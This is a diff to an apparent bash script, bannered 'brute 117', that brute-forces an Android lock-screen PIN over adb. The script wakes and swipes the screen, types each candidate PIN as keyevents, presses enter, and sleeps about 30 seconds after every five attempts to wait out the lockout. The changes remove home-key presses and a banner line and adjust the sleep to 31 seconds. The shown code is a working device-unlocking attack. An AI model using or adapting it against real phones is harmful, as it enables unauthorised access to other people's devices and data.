@@ -11,7 +11,6 @@ echo -e " ))~~~~~~~~~~~~~(( "
 echo -e "(( > brute 117 < ))"
 echo -e " )).............(( "
 echo -e "(((<-._.-'<-._.-)))"
-adb shell input keyevent 3
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
 while true
@@ -24,12 +23,10 @@ do
                 adb shell input keyevent $((`echo ${i:$j:1}`+7))
             done
             adb shell input keyevent 66
-            adb shell input keyevent 3
             if ! (( `expr $i + 1` % 5 )); then
-                echo -e " )).............(( "
                 echo -e "(( >  timeout  < ))"
                 echo -e "(((<-._.-'<-._.-)))"
-                sleep 30
+                sleep 31
             fi
         fi
     done
